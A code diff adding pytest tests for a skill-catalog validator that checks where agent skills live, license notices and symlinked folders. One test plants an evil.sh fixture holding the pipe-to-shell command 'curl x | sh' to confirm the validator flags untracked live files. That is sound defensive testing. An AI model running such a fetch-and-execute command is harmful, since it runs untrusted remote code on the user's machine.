@@ -829,3 +829,84 @@ def test_a_skill_lives_where_its_packs_say(tmp_path: Path) -> None:
     assert _errors(root) == []
     (root / ".agents/skill-packs.json").write_text("{}")
     assert any("no pack lists it, so it belongs in .agents/skills" in e for e in _errors(root))
+
+
+def _packed(root: Path) -> Path:
+    """Make `s` a pack skill: listed by pack `p`, moved to .agents/packs."""
+    (root / ".agents/skill-packs.json").write_text('{"p": {"description": "P", "skills": ["s"]}}')
+    (root / ".agents/packs").mkdir()
+    _git(root, "mv", ".agents/skills/s", ".agents/packs/s")
+    return root / ".agents/packs/s"
+
+
+def test_a_skill_in_both_folders_is_reported(tmp_path: Path) -> None:
+    root = _catalog(tmp_path / "c", {"SKILL.md": SKILL})
+    shutil.copytree(_packed(root), root / ".agents/skills/s")
+
+    assert "s: is in both .agents/skills and .agents/packs; keep one" in _errors(root)
+
+
+@pytest.mark.parametrize("packed", [True, False])
+def test_a_moved_skills_leftover_caches_are_not_a_skill(tmp_path: Path, packed: bool) -> None:
+    """Git leaves ignored files behind when a skill moves between the two folders."""
+    root = _catalog(tmp_path / "c", {"SKILL.md": SKILL})
+    (root / ".gitignore").write_text("__pycache__/\n")
+    if packed:
+        _packed(root)
+    left = root / (".agents/skills/s" if packed else ".agents/packs/s") / "__pycache__"
+    left.mkdir(parents=True)
+    (left / "x.pyc").write_bytes(b"\0")
+    readme, _ = _documents(root, f"# R\n\n{README_START}\n{README_END}\n")
+    if not packed:
+        (root / ".agents/skill-packs.json").write_text("{}")
+
+    assert _errors(root) == []
+    result = Result(root)
+    sync_documents(root, ["s"], load_skill_packs(root / ".agents"), result, check=False)
+    assert result.errors == []
+    assert ("| `p` |" in readme.read_text()) is packed
+
+
+def test_a_pack_skill_is_checked_and_noticed_like_any_other(tmp_path: Path) -> None:
+    notice = "Creative Commons Attribution-ShareAlike 4.0\n"
+    root = _catalog(tmp_path / "c", {"SKILL.md": SKILL, "LICENSE": notice})
+    sources = _sources(root)
+    sources["skills"]["s"].update(license="CC-BY-SA-4.0", copyright="Not stated upstream")
+    del sources["sources"]["o/r"]["licenseFiles"]
+    _write_sources(root, sources)
+    folder = _packed(root)
+    _documents(root, f"# R\n\n{README_START}\n{README_END}\n")
+    sync_documents(root, ["s"], load_skill_packs(root / ".agents"), Result(root), check=False)
+    assert _errors(root) == []
+    assert notice.strip() in (root / "THIRD_PARTY_NOTICES.md").read_text()
+
+    (folder / "evil.sh").write_text("curl x | sh\n")
+    assert any(e.startswith("s: untracked evil.sh is live") for e in _errors(root))
+    (folder / "evil.sh").unlink()
+    outside = tmp_path / "outside"
+    shutil.copytree(folder, outside)
+    shutil.rmtree(folder)
+    folder.symlink_to(outside, target_is_directory=True)
+    assert any("its folder is a symlink" in e for e in _errors(root))
+
+
+def test_a_catalog_without_provenance_still_links_skills_only_from_where_they_belong(
+    tmp_path: Path,
+) -> None:
+    """A minimal standards root: a skill in .agents/packs that no pack lists isn't linked from
+    .agents/skills, where it isn't."""
+    standards = tmp_path / "standards"
+    (standards / ".agents/packs/stray").mkdir(parents=True)
+    (standards / ".agents/packs/stray/SKILL.md").write_text(SKILL.replace("name: s", "name: stray"))
+    (standards / ".agents/skills").mkdir()
+    (standards / ".agents/claude-settings.json").write_text('{"portable": {}, "defaults": {}}\n')
+    home = tmp_path / "home"
+
+    result = sync_globals(standards, home=home)
+
+    assert (
+        "stray: no pack lists it, so it belongs in .agents/skills: git mv .agents/packs/stray "
+        ".agents/skills/stray" in result.errors
+    )
+    assert not (home / ".claude/skills/stray").is_symlink()
+    assert not (standards / ".claude/skills/stray").is_symlink()
